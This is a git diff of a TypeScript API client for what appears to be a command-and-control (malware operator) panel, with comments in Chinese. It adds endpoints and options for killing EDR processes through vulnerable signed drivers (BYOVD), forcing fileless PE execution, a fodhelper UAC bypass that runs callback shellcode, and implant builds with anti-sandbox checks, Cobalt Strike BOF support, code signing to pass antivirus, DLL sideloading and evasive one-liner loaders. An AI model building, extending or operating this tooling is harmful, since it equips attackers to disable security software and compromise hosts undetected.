@@ -106,12 +106,12 @@ export const sessionApi = {
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/blind`, {}),
   edrKill: (id: string, processes?: string[]) =>
     api.post<{ task_id: number; task_type: string; count: number; message: string }>(`/sessions/${id}/edr/kill`, { processes }),
-  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string }) =>
+  byovdLoad: (id: string, payload: { driver_b64: string; service_name?: string; device_name?: string; name?: string; kill_ioctl?: string; description?: string }) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-load`, payload),
   byovdUnload: (id: string, serviceName?: string) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-unload`, { service_name: serviceName }),
   /** BYOVD 驱动击杀：按 PID 或进程名调用内置驱动的无鉴权终止 IOCTL */
-  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string }) =>
+  byovdKill: (id: string, payload: { pid?: number; process_name?: string; driver?: string; device?: string; ioctl?: string }) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/byovd-kill`, payload),
   pplKill: (id: string, processes?: string[]) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/edr/ppl-kill`, { processes }),
@@ -123,8 +123,31 @@ export const sessionApi = {
     arch?: string
     /** exe_mem：等待执行线程结束的毫秒数（0/省略 = 不等待） */
     wait_ms?: number
+    /** 服务端 PE 预检判定为 reject 时，勾选此项强制下发（高危，服务端会记日志留痕） */
+    force?: boolean
   }) =>
-    api.post<{ task_id: number; task_type: string; kind: string; message: string }>(`/sessions/${id}/fileless-exec`, payload),
+    api.post<{
+      task_id: number
+      task_type: string
+      kind: string
+      args?: string
+      message: string
+      /** 预检 warn/reject 降级后的风险提示（任务已下发） */
+      warnings?: string[]
+      /** 处置建议（改用落地执行 / donut / shellcode 等） */
+      suggestion?: string
+      /** 预检结论：ok / warn / reject */
+      preflight_verdict?: string
+      /** 精简 PE 指纹，便于操作员核对 */
+      pe_info?: {
+        machine?: string
+        is_64bit?: boolean
+        is_dll?: boolean
+        has_tls?: boolean
+        has_clr?: boolean
+        is_go?: boolean
+      }
+    }>(`/sessions/${id}/fileless-exec`, payload),
   // UAC 提权：fodhelper 拉起高完整性进程，内存执行 shellcode 回连上线
   privescUAC: (id: string) =>
     api.post<{ task_id: number; task_type: string; message: string }>(`/sessions/${id}/privesc-uac`),
@@ -157,17 +180,42 @@ export interface BuiltinDriver {
   kill_pid_size?: number
   size: number
   sha256: string
-  /** 签名者（人工核对用） */
+  /** 签名者（来自 manifest 的人工标注，字符串；实测结论见 verify.signer） */
   signed?: string
+  /** 加载前自检结论（服务端 WinVerifyTrust + manifest sha256 一致性 + 黑名单策略提示） */
+  verify?: DriverVerifyResult
 }
 
-// 内置 BYOVD 利用驱动（当前内置 kgameprotect.sys，WHQL 签名二进制，嵌在服务端二进制中）
+/** 驱动加载前自检结论（对应服务端 drivers.VerifyResult） */
+export interface DriverVerifyResult {
+  sha256: string
+  manifest_sha256?: string
+  /** manifest 声明了期望哈希时，实际内容是否一致；false = 服务端会拒绝下发 */
+  hash_ok: boolean
+  /** 本机 WinVerifyTrust 是否校验通过 */
+  signed: boolean
+  /** 是否真的做过签名校验（非 Windows 或超时会为 false） */
+  signature_checked: boolean
+  /** 签名者简单显示名（取不到时为空） */
+  signer?: string
+  /** 本机是否启用了微软易受攻击驱动黑名单策略 */
+  blocklisted: boolean
+  blocklist_reason?: string
+  warnings?: string[]
+  errors?: string[]
+  /** 一句话中文结论 */
+  summary?: string
+}
+
+// BYOVD 驱动：由操作员自备（服务端不内置任何驱动），放 drivers/ 或 data/drivers/ + manifest.json
 export const driversApi = {
   list: () => api.get<{ drivers: BuiltinDriver[]; count: number }>('/drivers'),
   raw: async (name: string) => {
     const r = await api.get<ArrayBuffer>(`/drivers/${encodeURIComponent(name)}/raw`, { responseType: 'arraybuffer' })
     return r.data
   },
+  /** 单独查询某个驱动的加载前自检结论 */
+  verify: (name: string) => api.get<DriverVerifyResult & { ok: boolean }>(`/drivers/${encodeURIComponent(name)}/verify`),
 }
 
 // 运行时设置（设置页真实读写，保存后热生效）
@@ -278,9 +326,16 @@ export interface BuildRequest {
   listener_id: string
   server_url: string
   protocol: string
+  /**
+   * 心跳间隔（秒）。**留空/0 = 跟随服务端配置**（「设置 → 植入端默认参数」里的
+   * `implant.interval`，未配置时回退 60s）。构建页输入框留空即发 0。
+   */
   interval: number
+  /** 抖动（%）。**留空/0 = 跟随服务端配置**（`implant.jitter`，未配置时回退 20%）。 */
   jitter: number
+  /** 重试次数。**留空/0 = 用默认值 3**（该项没有服务端配置项）。 */
   retry_count: number
+  /** 重试间隔（秒）。**留空/0 = 跟随服务端配置**（`implant.retry_wait`，未配置时回退 5s）。 */
   retry_wait: number
   kill_date: string
   working_hours: string
@@ -297,6 +352,27 @@ export interface BuildRequest {
   xor_key_size?: number
   garble_enabled?: boolean
   upx_enabled?: boolean
+  /**
+   * 主动反沙箱进程检测（默认关闭）：启动时枚举进程并与安全软件/分析工具进程名
+   * 比对，命中则延迟执行。国产杀软（360/火绒/电脑管家）主动防御会拦截该对抗行为，
+   * 且会把 toolhelp32 导入与进程名字符串写进载荷，故默认不编译。
+   */
+  evasion_scan?: boolean
+  /**
+   * BOF 支持（默认关闭）：开启会带上整套 Cobalt Strike Beacon API 名字
+   * （BeaconDataParse/BeaconOutput…，实测 22 处 pclntab 明文），只在需要跑 BOF 时开。
+   */
+  bof_enabled?: boolean
+  /**
+   * 构建后代码签名（Authenticode）：证书配置在服务端 builder.sign_*，这里只能开启。
+   * 未签名的新 PE 在装有 360/电脑管家的主机上会被拒绝执行并删除。
+   */
+  sign_enabled?: boolean
+  /** DLL 载荷（format=dll）：导出函数名（rundll32 payload.dll,<名字>；留空=Start） */
+  dll_export?: string
+  /** DLL 载荷是否"加载即启动"（白加黑场景宿主不一定调用我们的导出函数，默认 true） */
+  dll_autostart?: boolean
+  /** 启动随机延迟（秒）：留空用服务端配置（implant.startup_delay_min/max） */
   startup_delay_min?: number
   startup_delay_max?: number
 }
@@ -319,6 +395,20 @@ export interface BuildResponse {
   one_liner_warning?: string
   /** 多条免杀上线命令变体（PowerShell/BITS/LOLBin/curl/python 等） */
   one_liners?: OneLinerVariant[]
+  /** 产物是否带有效 Authenticode 签名（启用代码签名时才有意义） */
+  signed?: boolean
+  /** 签名者主题（如 CN=xxx, O=yyy） */
+  signer?: string
+  /** 实际使用的签名方式：powershell / signtool / none */
+  sign_method?: string
+  /** 签名复核状态：Valid / NotSigned / UnknownError … */
+  sign_status?: string
+  /** 中文说明（未签名的原因 / 失败原因） */
+  sign_message?: string
+  /** 落地链建议标题（按平台/格式 + 是否已签名给出"该走哪条链"） */
+  loader_advice_title?: string
+  /** 落地链建议要点，顺序即优先级（直接运行 → 计划任务 → 白加黑 → 内存加载） */
+  loader_advice_tips?: string[]
 }
 
 /** 一条命令上线的单个变体：由服务端生成，前端只做展示与复制 */
@@ -331,6 +421,8 @@ export interface OneLinerVariant {
   /** 手法与适用场景说明 */
   desc: string
   command: string
+  /** 加载器链的补充说明：前置条件 / 占位符含义 / 国产杀软下的风险等级 */
+  note?: string
 }
 
 /** 一键上线命令集合：含下载地址解析结果与不可达告警 */
@@ -361,11 +453,36 @@ export interface BuilderInfo {
     retry_count: { min: number; max: number; default: number }
     retry_wait: { min: number; max: number; default: number }
   }
+  /**
+   * 服务端「设置 → 植入端默认参数」里的**当前生效值**（服务端已按构建时的归一化
+   * 规则算好）。生成载荷页把它们显示成对应输入框的 placeholder：留空 = 跟随服务端，
+   * 这样就不用"设置里配一遍、构建页再填一遍"。
+   */
+  implant_defaults?: {
+    interval?: number
+    jitter?: number
+    retry_count?: number
+    retry_wait?: number
+    startup_delay_min?: number
+    startup_delay_max?: number
+  }
   evasion?: {
     garble_available: boolean
     /** garble 不可用的原因（或可用时的路径说明） */
     garble_message?: string
     upx_available: boolean
+    /** 服务端是否已配好代码签名证书（builder.sign_enabled + pfx/指纹） */
+    sign_configured?: boolean
+    /** 代码签名的配置说明（未配置原因 / 使用的证书与签名栈） */
+    sign_message?: string
+    /** BOF 默认是否编译进载荷（恒为 false：需要时在页面勾选） */
+    bof_default?: boolean
+    /** 本机能否为 amd64 构建真正的 DLL（兼容字段；按架构判断请用 dll_arch） */
+    dll_available?: boolean
+    /** DLL 能力说明（不可用时给出安装哪种 gcc） */
+    dll_message?: string
+    /** 按目标架构分别给出 DLL 能力：c-shared 需要与架构一致的 mingw gcc */
+    dll_arch?: Record<string, { available: boolean; message: string }>
   }
 }
 
